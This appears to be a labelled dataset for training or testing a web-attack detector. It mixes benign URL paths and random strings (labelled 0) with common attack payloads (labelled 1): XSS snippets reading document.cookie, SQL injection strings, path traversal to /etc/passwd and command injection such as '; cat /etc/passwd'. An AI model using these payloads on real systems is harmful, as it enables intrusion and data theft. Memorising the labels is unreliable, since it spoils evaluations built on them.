%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
ePbxBVl5URf,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/home?id=5401,0
blog,0
' OR 1=1 --,1
/index?id=2229,0
<script>var a=885;alert(a)</script>,1
<script>var a=617;alert(a)</script>,1
7umQS2TGD3BUa,0
/contact?session=40486,0
<script>var a=478;alert(a)</script>,1
../../../../etc/passwd,1
/checkout?session=29254,0
<script>var a=634;alert(a)</script>,1
' OR 1=1 --,1
<script>var a=194;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
sVIc9zBIqp6Y9nB,0
kWWHXOqQZJB,0
s E l E c T * f R o M a d m i n,1
/home?session=33593,0
../../../windows/win.ini,1
' OR '1'='1,1
' OR 6=4 --,1
/home?session=21046,0
; cat /etc/passwd,1
<script>var a=151;alert(a)</script>,1
/home?id=3824,0
1' o r '1'='1,1
onerror=alert(1),1
Wz6B6qVOlJ8pcV,0
<script>var a=588;alert(a)</script>,1
/index?session=92515,0
/register?session=98438,0
/blog?id=3080,0
../../../windows/win.ini,1
/user?id=4016,0
/profile?session=89264,0
<script>var a=964;alert(a)</script>,1
ryd4YWa7,0
/home?id=4684,0
/search?session=38731,0
/blog?id=9713,0
' OR 7=5 --,1
admin%00' OR 1=1,1
javascript:alert(1),1
' OR 8=1 --,1
dashboard,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
cart,0
/checkout?id=7427,0
../../../../etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
profile,0
<script>var a=441;alert(a)</script>,1
oZwXoqrExiBDk,0
<script>var a=857;alert(a)</script>,1
90w9YDrQrS,0
onerror=alert(1),1
s E l E c T * f R o M a d m i n,1
Hs0KWLuP,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/search?id=7643,0
' OR 1=6 --,1
/profile?id=2871,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
RBlLVaP5M,0
/dashboard?id=5718,0
| whoami,1
' OR 4=8 --,1
' OR 5=2 --,1
q0oPjT0OJFwjs,0
admin'/* bypass */OR 1=1,1
QzErstgft47Ia8,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>alert(document.cookie)</script>,1
login,0
/dashboard?id=4721,0
BMHvxPW5QRBTMW3,0
' OR 4=6 --,1
' OR 1=1 --,1
OwH2Tx3IxznEv,0
/cart?session=14225,0
register,0
' OR 1=1 --,1
<script>var a=809;alert(a)</script>,1
| whoami,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
RlvDytzbmPEDUP,0
/home?id=1072,0
onerror=alert(1),1
contact,0
admin'/* bypass */OR 1=1,1
' OR '1'='1,1
pdekylku,0
onerror=alert(1),1
profile,0
; cat /etc/passwd,1
<script>var a=650;alert(a)</script>,1
lxa30Ime4mCQ8a,0
/contact?session=51030,0
' OR 8=8 --,1
../../../windows/win.ini,1
GmDQLg0KR4m8cY,0
/register?id=383,0
<script>alert(document.cookie)</script>,1
; cat /etc/passwd,1
cart,0
onerror=alert(1),1
EjNOngqrhX59,0
; cat /etc/passwd,1
1' o r '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin%00' OR 1=1,1
mqxVC45n,0
admin%00' OR 1=1,1
Wirp9v1J,0
HFJqcO1lSgV,0
/cart?session=93320,0
<script>alert(document.cookie)</script>,1
<script>var a=507;alert(a)</script>,1
' OR 2=5 --,1
<script>var a=541;alert(a)</script>,1
/blog?id=56,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=628;alert(a)</script>,1
0uiq3EcfUVr9,0
<script>var a=227;alert(a)</script>,1
EravtSuUz7,0
<script>var a=480;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin' --,1
profile,0
/index?session=83288,0
/settings?session=97419,0
/register?session=19429,0
/settings?id=5321,0
register,0
admin'/* bypass */OR 1=1,1
admin%00' OR 1=1,1
admin%00' OR 1=1,1
cart,0
/settings?id=4910,0
onerror=alert(1),1
' OR 1=3 --,1
admin%00' OR 1=1,1
/index?id=6503,0
' OR 9=4 --,1
/search?id=3716,0
<script>var a=672;alert(a)</script>,1
admin%00' OR 1=1,1
/checkout?session=55525,0
<script>var a=656;alert(a)</script>,1
/login?id=9009,0
<script>var a=10;alert(a)</script>,1
DIG0ZYtEh,0
onerror=alert(1),1
' OR 1=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
onerror=alert(1),1
<script>alert(document.cookie)</script>,1
/settings?id=8333,0
' OR 3=2 --,1
35QFJQuVeGkk83,0
/settings?session=99264,0
../../../windows/win.ini,1
' OR 1=3 --,1
' OR 3=8 --,1
home,0
<script>var a=581;alert(a)</script>,1
/blog?id=5874,0
<script>var a=360;alert(a)</script>,1
' OR 2=9 --,1
about,0
s E l E c T * f R o M a d m i n,1
../../../../etc/passwd,1
/login?session=37658,0
admin'/* bypass */OR 1=1,1
s E l E c T * f R o M a d m i n,1
' OR 1=1 --,1
<script>var a=321;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR '1'='1,1
javascript:alert(1),1
' OR 8=1 --,1
/login?id=1642,0
/blog?id=4586,0
/profile?id=2736,0
<script>var a=210;alert(a)</script>,1
3IrWYRSH,0
admin'/* bypass */OR 1=1,1
/register?id=5595,0
' OR 3=5 --,1
index,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/checkout?id=3422,0
; cat /etc/passwd,1
profile,0
' OR '1'='1,1
/home?session=27773,0
ussfrAVHA,0
jqKZvMRnwK0c1aB,0
' OR 4=5 --,1
' OR 2=8 --,1
/dashboard?session=15479,0
<script>var a=161;alert(a)</script>,1
javascript:alert(1),1
no8pXKJWOT,0
/register?id=7387,0
6NOGWRLR,0
/settings?session=38228,0
/home?id=8923,0
' OR '1'='1,1
TB8oBkjf,0
1' o r '1'='1,1
<script>var a=185;alert(a)</script>,1
/user?session=55424,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
mVkqsVsy,0
/cart?id=1538,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=806;alert(a)</script>,1
cart,0
hP3hBnGgxCx,0
/about?session=31135,0
/search?session=90464,0
/user?id=7943,0
' OR 7=6 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
NjJIInTN9bb,0
/checkout?session=86030,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin%00' OR 1=1,1
home,0
/index?session=12015,0
| whoami,1
../../../../etc/passwd,1
/contact?id=1161,0
' OR 1=6 --,1
<script>var a=791;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
../../../windows/win.ini,1
../../../../etc/passwd,1
<script>var a=807;alert(a)</script>,1
onerror=alert(1),1
' OR 7=7 --,1
' OR 2=5 --,1
/dashboard?id=6362,0
<script>var a=937;alert(a)</script>,1
<script>var a=430;alert(a)</script>,1
AJaXxhTe3XbN3GF,0
<script>var a=877;alert(a)</script>,1
/index?id=6407,0
home,0
/login?session=21132,0
admin%00' OR 1=1,1
admin%00' OR 1=1,1
O8mj0a2j6OuRiZ,0
MciKVYFuufdL,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin'/* bypass */OR 1=1,1
/search?id=9464,0
| whoami,1
' OR 2=2 --,1
cart,0
<script>var a=936;alert(a)</script>,1
' OR 3=9 --,1
; cat /etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
Bf1FNEqOJKJwB,0
<script>var a=126;alert(a)</script>,1
<script>var a=202;alert(a)</script>,1
' OR 1=1 --,1
/checkout?id=9344,0
/profile?id=3358,0
/settings?session=36864,0
| whoami,1
profile,0
/settings?session=22421,0
W1g6OihfKD,0
' OR 7=2 --,1
<script>var a=912;alert(a)</script>,1
/home?session=93807,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
login,0
/profile?id=4285,0
javascript:alert(1),1
../../../../etc/passwd,1
4NTM42w2,0
<script>var a=997;alert(a)</script>,1
kKHogUWvocgkevc,0
TVKmpFZSi5HEsUv,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
| whoami,1
/index?session=51471,0
<script>var a=21;alert(a)</script>,1
/user?id=6066,0
/search?session=22556,0
' OR 1=1 --,1
/settings?id=2851,0
s E l E c T * f R o M a d m i n,1
Ct6PZnVsYbJ,0
<script>var a=579;alert(a)</script>,1
/cart?id=463,0
/contact?session=31310,0
admin'/* bypass */OR 1=1,1
RI6AjdDbiOxaI5j,0
index,0
' OR 2=9 --,1
' OR '1'='1,1
XMjti3X1UySFgw,0
IRo6hTNP0w0Ry,0
/about?session=73629,0
' OR 1=7 --,1
blog,0
xiMdi7IkXnL3PTh,0
cZuDpeCCOCXuy,0
home,0
/cart?session=55097,0
settings,0
blog,0
profile,0
../../../../etc/passwd,1
../../../windows/win.ini,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 7=8 --,1
KVr2LSM3EJ,0
search,0
../../../windows/win.ini,1
pqB7pI2ZxxKBfO4,0
admin' --,1
admin'/* bypass */OR 1=1,1
Dxt0mbi5Tr8VL,0
home,0
2oC9OJc9A8IsO,0
' OR 7=3 --,1
/cart?session=38843,0
| whoami,1
../../../../etc/passwd,1
/contact?session=50239,0
<script>var a=561;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
<script>var a=810;alert(a)</script>,1
/home?id=5448,0
D8Zv5QfRLVQ,0
| whoami,1
ZVmmkdsP,0
' OR 3=1 --,1
' OR 8=5 --,1
<script>var a=107;alert(a)</script>,1
' OR 7=4 --,1
/cart?id=9357,0
1' o r '1'='1,1
| whoami,1
/user?id=1750,0
/login?session=18875,0
checkout,0
; cat /etc/passwd,1
../../../windows/win.ini,1
/dashboard?session=88047,0
/settings?id=6756,0
/index?id=7022,0
; cat /etc/passwd,1
contact,0
about,0
admin'/* bypass */OR 1=1,1
/index?session=73117,0
onerror=alert(1),1
../../../../etc/passwd,1
profile,0
admin%00' OR 1=1,1
| whoami,1
/login?id=8578,0
/contact?id=1303,0
' OR '1'='1,1
/cart?session=62533,0
index,0
vpKmXn8Ho,0
/register?session=25545,0
register,0
' OR 2=3 --,1
/checkout?id=9420,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
dyGbtiUVTXG9,0
/register?session=11562,0
/register?id=7937,0
<script>var a=698;alert(a)</script>,1
/checkout?id=6098,0
user,0
' OR '1'='1,1
/cart?session=19536,0
home,0
admin%00' OR 1=1,1
dashboard,0
' OR 2=4 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
cart,0
<script>var a=921;alert(a)</script>,1
' OR '1'='1,1
/login?session=66818,0
dashboard,0
<script>var a=381;alert(a)</script>,1
/contact?id=3386,0
<script>var a=327;alert(a)</script>,1
Gt6TVLzL6,0
/user?id=1601,0
; cat /etc/passwd,1
admin'/* bypass */OR 1=1,1
/index?id=5012,0
RXiFDnGW,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 5=2 --,1
admin%00' OR 1=1,1
tRSzx4BqI,0
| whoami,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/profile?session=61366,0
cart,0
A13zKmY3oB50OMh,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 4=7 --,1
/cart?session=63293,0
contact,0
<script>alert(document.cookie)</script>,1
<script>var a=767;alert(a)</script>,1
/home?session=73588,0
/index?session=22945,0
' OR 7=9 --,1
' OR 9=5 --,1
/checkout?session=69387,0
../../../windows/win.ini,1
' OR 4=4 --,1
/login?id=3781,0
<script>var a=247;alert(a)</script>,1
/blog?session=44069,0
8K1aOGXezKC,0
onerror=alert(1),1
' OR 6=6 --,1
settings,0
/checkout?id=4931,0
6g6GiUBR,0
pEKe2gfWO2LZ4Ya,0
admin'/* bypass */OR 1=1,1
' OR 7=8 --,1
<script>var a=428;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/settings?id=1523,0
' OR 1=1 --,1
../../../windows/win.ini,1
; cat /etc/passwd,1
user,0
<script>var a=665;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
1' o r '1'='1,1
/user?id=6639,0
/login?id=4102,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
index,0
javascript:alert(1),1
' OR 1=1 --,1
/search?session=26414,0
/register?id=9527,0
oMNiPNxVnb,0
contact,0
../../../windows/win.ini,1
YgYEeVtrhNPh,0
../../../windows/win.ini,1
admin'/* bypass */OR 1=1,1
<script>var a=22;alert(a)</script>,1
/checkout?session=67671,0
/index?session=57759,0
/search?id=7325,0
javascript:alert(1),1
javascript:alert(1),1
../../../../etc/passwd,1
GhUNFlI9FccKFD,0
index,0
dashboard,0
' OR 7=9 --,1
cart,0
' OR 8=9 --,1
/checkout?id=4743,0
../../../../etc/passwd,1
../../../windows/win.ini,1
<script>var a=597;alert(a)</script>,1
2uoDaha9kA,0
onerror=alert(1),1
/register?session=75674,0
/settings?session=56756,0
/login?session=59572,0
blog,0
/contact?session=69182,0
onerror=alert(1),1
checkout,0
/home?session=70114,0
' OR '1'='1,1
onerror=alert(1),1
' OR 1=4 --,1
DEhWMUzxS,0
admin'/* bypass */OR 1=1,1
cart,0
2c2lAHNVaQi,0
' OR '1'='1,1
HsZnssPm,0
ihJjQUS2t,0
' OR 4=4 --,1
Jl5JGb9YcveV,0
1' o r '1'='1,1
/user?id=6014,0
' OR 8=3 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
register,0
onerror=alert(1),1
/cart?session=36340,0
' OR 9=4 --,1
' OR 5=2 --,1
WGLD3qlkPWDR4SD,0
OT0jwaMBxsS9AWN,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>alert(document.cookie)</script>,1
<script>var a=532;alert(a)</script>,1
<script>var a=916;alert(a)</script>,1
index,0
index,0
' OR 5=8 --,1
<script>alert(document.cookie)</script>,1
contact,0
' OR 3=8 --,1
yl9TvysO,0
home,0
admin' --,1
/checkout?id=4181,0
../../../../etc/passwd,1
' OR 8=5 --,1
| whoami,1
/user?id=483,0
javascript:alert(1),1
admin'/* bypass */OR 1=1,1
<script>var a=536;alert(a)</script>,1
register,0
<script>var a=840;alert(a)</script>,1
0dt6NQbE0G,0
' OR '1'='1,1
| whoami,1
cart,0
/login?session=97257,0
/settings?id=9484,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
s E l E c T * f R o M a d m i n,1
/search?id=4461,0
/search?session=18238,0
; cat /etc/passwd,1
' OR 5=1 --,1
RzkPxOnDu,0
s E l E c T * f R o M a d m i n,1
| whoami,1
../../../windows/win.ini,1
/about?session=32675,0
admin%00' OR 1=1,1
s E l E c T * f R o M a d m i n,1
WP93jAOe,0
search,0
/profile?id=2097,0
/register?session=88363,0
' OR 3=4 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
1' o r '1'='1,1
admin%00' OR 1=1,1
' OR 2=6 --,1
/profile?session=28838,0
dashboard,0
' OR 4=4 --,1
1' o r '1'='1,1
' OR 6=5 --,1
admin'/* bypass */OR 1=1,1
' OR 1=1 --,1
javascript:alert(1),1
cart,0
/about?session=33334,0
admin%00' OR 1=1,1
/search?id=2952,0
| whoami,1
/search?session=58133,0
dWqNSVnY0N,0
admin' --,1
/login?id=7250,0
sUYtiP8Kg6Z,0
qgSTp46lY,0
1' o r '1'='1,1
' OR 9=8 --,1
<script>var a=795;alert(a)</script>,1
<script>var a=206;alert(a)</script>,1
register,0
about,0
onerror=alert(1),1
/profile?session=14717,0
1' o r '1'='1,1
profile,0
/dashboard?session=59725,0
' OR '1'='1,1
/contact?id=9217,0
/settings?id=971,0
' OR 4=3 --,1
<script>var a=67;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
' OR '1'='1,1
admin' --,1
<script>var a=94;alert(a)</script>,1
a8IfIyFkfDXdqfW,0
admin%00' OR 1=1,1
checkout,0
blog,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 7=6 --,1
/login?id=4751,0
<script>var a=724;alert(a)</script>,1
aJo7iJX1FNT3,0
javascript:alert(1),1
1' o r '1'='1,1
/settings?id=4154,0
; cat /etc/passwd,1
index,0
' OR 9=8 --,1
admin' --,1
/user?session=38761,0
contact,0
/about?id=6698,0
admin%00' OR 1=1,1
PrNZjxnX7TtCVYX,0
fHXitamzoSGGu,0
<script>alert(document.cookie)</script>,1
D596rfHSm2mORp,0
register,0
YVFVNtebLwCLs,0
' OR 4=8 --,1
' OR 8=9 --,1
dashboard,0
onerror=alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
PVG4UUMLxn4gQs,0
' OR 6=2 --,1
/about?session=44096,0
../../../../etc/passwd,1
checkout,0
../../../windows/win.ini,1
admin'/* bypass */OR 1=1,1
/dashboard?id=2191,0
/cart?id=4726,0
/dashboard?session=41934,0
dashboard,0
admin' --,1
/profile?session=66772,0
checkout,0
/profile?session=20191,0
' OR 7=9 --,1
/dashboard?id=594,0
1' o r '1'='1,1
s E l E c T * f R o M a d m i n,1
checkout,0
/contact?id=1070,0
/cart?id=4796,0
/dashboard?id=7625,0
hMzO7Jfe3m,0
/login?session=92045,0
about,0
<script>var a=520;alert(a)</script>,1
<script>var a=318;alert(a)</script>,1
| whoami,1
XB2Q5zUKP,0
login,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
fc8Dcwrgc,0
/settings?session=87890,0
h1eKKi3Ngm68,0
99MjbEz7,0
' OR 3=7 --,1
/about?session=15642,0
dashboard,0
kLo7QlzRpGy,0
am36QZ2fmxk8Gc,0
dashboard,0
../../../../etc/passwd,1
' OR 3=4 --,1
' OR 4=7 --,1
/search?id=537,0
blog,0
4rW0znEfOaot2,0
' OR '1'='1,1
' OR 6=6 --,1
user,0
/contact?id=1094,0
cart,0
| whoami,1
' OR 4=9 --,1
' OR 2=2 --,1
m1NkCR5WC18J3,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=279;alert(a)</script>,1
settings,0
<script>var a=184;alert(a)</script>,1
/index?session=81892,0
' OR 3=7 --,1
' OR 4=7 --,1
/index?session=14661,0
register,0
' OR 7=2 --,1
/checkout?id=5154,0
/profile?session=80584,0
javascript:alert(1),1
../../../../etc/passwd,1
' OR 1=5 --,1
' OR 1=9 --,1
../../../windows/win.ini,1
' OR 8=7 --,1
javascript:alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
yHCbsF5IXI746,0
/dashboard?id=6982,0
/dashboard?id=9853,0
contact,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/contact?session=91357,0
/settings?session=74504,0
' OR 8=3 --,1
TKQBsgXkSH,0
<script>var a=878;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin%00' OR 1=1,1
m9IXoh1Xv,0
admin' --,1
' OR 1=8 --,1
admin' --,1
<script>var a=104;alert(a)</script>,1
/checkout?id=4167,0
oY2lWW0b4Iy3eH,0
/search?id=7157,0
home,0
<script>var a=976;alert(a)</script>,1
vqLuMnOojp,0
' OR '1'='1,1
/register?id=6958,0
/about?session=80284,0
dSgVhMsiRlU9d,0
/dashboard?id=4008,0
/about?session=68803,0
admin%00' OR 1=1,1
user,0
contact,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin%00' OR 1=1,1
; cat /etc/passwd,1
/user?session=61203,0
' OR 3=3 --,1
cart,0
<script>var a=873;alert(a)</script>,1
/settings?id=3153,0
6TurGHU3e,0
ZetbXDcChH,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
5u6UmfZDU7Sn,0
<script>var a=73;alert(a)</script>,1
1' o r '1'='1,1
onerror=alert(1),1
UKMwUVGTkR7Zi9G,0
/settings?session=48955,0
onerror=alert(1),1
<script>var a=693;alert(a)</script>,1
1' o r '1'='1,1
/profile?session=90735,0
/dashboard?session=63470,0
/index?id=2182,0
<script>var a=492;alert(a)</script>,1
' OR 4=2 --,1
checkout,0
dashboard,0
<script>var a=623;alert(a)</script>,1
/contact?id=3047,0
; cat /etc/passwd,1
/profile?session=90584,0
/contact?session=51915,0
s E l E c T * f R o M a d m i n,1
r4wRUcsSPu0k,0
1' o r '1'='1,1
home,0
' OR 1=1 --,1
/settings?session=37415,0
admin' --,1
/profile?id=2428,0
KfV08nByOVMdR9R,0
javascript:alert(1),1
<script>var a=728;alert(a)</script>,1
<script>var a=810;alert(a)</script>,1
' OR 1=1 --,1
DygC0d375E,0
dhaUZ7Kvem,0
shAwVqLQUK57N,0
sTJWcIEaGtL,0
admin'/* bypass */OR 1=1,1
/register?session=67883,0
admin'/* bypass */OR 1=1,1
<script>var a=597;alert(a)</script>,1
/about?session=19861,0
login,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../../etc/passwd,1
dashboard,0
about,0
admin'/* bypass */OR 1=1,1
' OR 6=4 --,1
m9hQ2GcZ,0
yiJaSA38J,0
/checkout?id=2741,0
' OR 7=1 --,1
PP7gOjP1Dp,0
/about?session=60878,0
kPQ1CJsF2v0W,0
; cat /etc/passwd,1
../../../../etc/passwd,1
' OR 6=3 --,1
/contact?id=958,0
dashboard,0
/home?session=55271,0
<script>var a=654;alert(a)</script>,1
| whoami,1
/user?id=392,0
login,0
| whoami,1
/login?id=7222,0
41twiEVqjO,0
/dashboard?session=85400,0
checkout,0
admin%00' OR 1=1,1
/register?session=89606,0
E70PzxlF2,0
/blog?session=29467,0
settings,0
/settings?session=98262,0
atv8Gna1T4dBUM,0
' OR '1'='1,1
1' o r '1'='1,1
s E l E c T * f R o M a d m i n,1
<script>var a=221;alert(a)</script>,1
about,0
admin' --,1
home,0
' OR 1=1 --,1
/login?id=4657,0
onerror=alert(1),1
' OR 6=4 --,1
<script>var a=371;alert(a)</script>,1
' OR 1=1 --,1
' OR '1'='1,1
dashboard,0
' OR 7=7 --,1
admin'/* bypass */OR 1=1,1
3MHKCeg3fM,0
cart,0
s E l E c T * f R o M a d m i n,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin'/* bypass */OR 1=1,1
/index?session=80546,0
admin' --,1
cart,0
/settings?id=9433,0
/register?session=93082,0
checkout,0
admin' --,1
<script>var a=480;alert(a)</script>,1
/profile?session=63165,0
' OR 2=1 --,1
' OR 5=8 --,1
' OR 3=5 --,1
/home?id=6178,0
/home?id=1487,0
' OR 9=1 --,1
/contact?id=2047,0
blog,0
' OR 6=3 --,1
checkout,0
<script>var a=673;alert(a)</script>,1
/cart?session=32241,0
../../../../etc/passwd,1
/login?id=1442,0
/home?id=7021,0
; cat /etc/passwd,1
FxlA8IggliZV,0
/about?id=5657,0
<script>var a=68;alert(a)</script>,1
/checkout?session=51480,0
/home?id=1865,0
<script>alert(document.cookie)</script>,1
dashboard,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
| whoami,1
javascript:alert(1),1
onerror=alert(1),1
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin'/* bypass */OR 1=1,1
<script>var a=921;alert(a)</script>,1
checkout,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin%00' OR 1=1,1
profile,0
admin' --,1
' OR '1'='1,1
0oO6Uea1s6LGVBx,0
<script>var a=79;alert(a)</script>,1
admin' --,1
../../../windows/win.ini,1
<script>var a=892;alert(a)</script>,1
1' o r '1'='1,1
/blog?id=1482,0
5vJAdfnoR9ol4u,0
/dashboard?id=8371,0
javascript:alert(1),1
/dashboard?id=2536,0
' OR '1'='1,1
/blog?id=9867,0
/checkout?id=9069,0
| whoami,1
' OR 4=6 --,1
' OR 6=4 --,1
dashboard,0
checkout,0
/profile?id=6708,0
' OR 4=3 --,1
/cart?id=8194,0
/cart?id=4295,0
/search?id=2830,0
' OR '1'='1,1
blog,0
' OR 1=1 --,1
<script>var a=544;alert(a)</script>,1
2v8c19Or9ytmyz,0
contact,0
../../../../etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?id=4372,0
/home?session=94749,0
user,0
/home?session=22520,0
/blog?id=4682,0
search,0
; cat /etc/passwd,1
../../../../etc/passwd,1
GgPRC4fZtWU7i,0
' OR 6=2 --,1
/index?id=631,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>alert(document.cookie)</script>,1
login,0
' OR 8=2 --,1
contact,0
LupHVvUvmdBcfL,0
/about?id=9795,0
ZnUk7DP3X,0
admin'/* bypass */OR 1=1,1
GVYKVpR6rYDd,0
about,0
/login?id=292,0
/checkout?session=50641,0
ubu1wgGZfpqlO,0
<script>var a=12;alert(a)</script>,1
' OR 1=1 --,1
n6gG5u74g5j2,0
s E l E c T * f R o M a d m i n,1
/settings?id=4480,0
/blog?id=8209,0
/settings?session=73206,0
' OR 7=8 --,1
| whoami,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
7VkXYSbl,0
../../../../etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 7=4 --,1
../../../../etc/passwd,1
/login?id=2402,0
/home?session=96365,0
admin%00' OR 1=1,1
; cat /etc/passwd,1
1' o r '1'='1,1
' OR 1=1 --,1
' OR 2=6 --,1
' OR 9=6 --,1
onerror=alert(1),1
6aHwNaw74O,0
admin%00' OR 1=1,1
' OR 9=2 --,1
/home?session=41515,0
javascript:alert(1),1
' OR 1=1 --,1
/about?id=9794,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>alert(document.cookie)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/index?session=51687,0
BaCxajwXEc3yN,0
j7A6WHMz0R,0
admin%00' OR 1=1,1
; cat /etc/passwd,1
checkout,0
OCjFo9oT4Z8,0
user,0
/blog?id=1308,0
<script>var a=425;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?id=3821,0
/about?session=60023,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
register,0
ollOdQX3O,0
/cart?session=75074,0
ZUaWQzcRF9VUM0s,0
QFtPDnYqox,0
/settings?session=34742,0
/about?id=4388,0
1' o r '1'='1,1
<script>var a=126;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
1zPSXoYNRQeB,0
<script>var a=514;alert(a)</script>,1
profile,0
/dashboard?id=6697,0
onerror=alert(1),1
about,0
/blog?session=97770,0
Dmupym3iIuiX,0
/settings?session=99069,0
/login?session=12217,0
rOmdwp25Fn,0
../../../windows/win.ini,1
' OR 2=2 --,1
<script>var a=34;alert(a)</script>,1
/about?session=20783,0
/cart?session=22025,0
/blog?id=413,0
' OR 8=3 --,1
' OR 6=9 --,1
../../../windows/win.ini,1
/checkout?id=4541,0
/checkout?session=18415,0
/search?session=16475,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/dashboard?session=84090,0
/settings?id=2796,0
7Q5u7LzXbntXRfw,0
admin%00' OR 1=1,1
/dashboard?session=74631,0
3lSHtmf74bGgfb,0
/register?session=16915,0
/login?session=16599,0
blog,0
<script>var a=870;alert(a)</script>,1
/search?session=13832,0
/profile?session=85146,0
<script>var a=185;alert(a)</script>,1
; cat /etc/passwd,1
<script>var a=168;alert(a)</script>,1
' OR 6=4 --,1
<script>alert(document.cookie)</script>,1
<script>alert(document.cookie)</script>,1
' OR 9=1 --,1
../../../windows/win.ini,1
cart,0
<script>alert(document.cookie)</script>,1
/user?session=23370,0
login,0
/home?id=6676,0
/register?session=44043,0
' OR 1=1 --,1
UhSKfIDpJC1,0
9K1lLcvua04,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
FXsgJxwAf4tz,0
' OR 3=8 --,1
s E l E c T * f R o M a d m i n,1
checkout,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 6=1 --,1
/dashboard?id=1608,0
' OR 8=5 --,1
admin' --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
blog,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
; cat /etc/passwd,1
/search?session=18169,0
' OR 7=1 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 9=1 --,1
javascript:alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/dashboard?session=82523,0
' OR '1'='1,1
' OR 5=4 --,1
onerror=alert(1),1
onerror=alert(1),1
BBS924Ixtg,0
3ByWFPYr,0
javascript:alert(1),1
login,0
' OR 1=1 --,1
<script>var a=781;alert(a)</script>,1
1' o r '1'='1,1
' OR 9=1 --,1
' OR 3=3 --,1
admin' --,1
<script>var a=56;alert(a)</script>,1
' OR '1'='1,1
| whoami,1
../../../windows/win.ini,1
1' o r '1'='1,1
<script>var a=296;alert(a)</script>,1
admin%00' OR 1=1,1
/checkout?id=1808,0
cart,0
2WCDWSH5U,0
' OR 1=1 --,1
<script>var a=273;alert(a)</script>,1
/blog?id=3280,0
0KGXlR5OPjrO,0
/profile?session=52699,0
aG3tOVvxr,0
B84qkzhaXaoJJ0g,0
/dashboard?session=33611,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
cycgBJMGoCI,0
/contact?session=19050,0
search,0
../../../windows/win.ini,1
uaSrT9pLdcRNC,0
/settings?id=8604,0
/blog?session=32242,0
admin%00' OR 1=1,1
XbLZ0DmEK,0
N8bu2Uidu3oX,0
<script>var a=446;alert(a)</script>,1
../../../windows/win.ini,1
Rjp8s8z5mS9kFMh,0
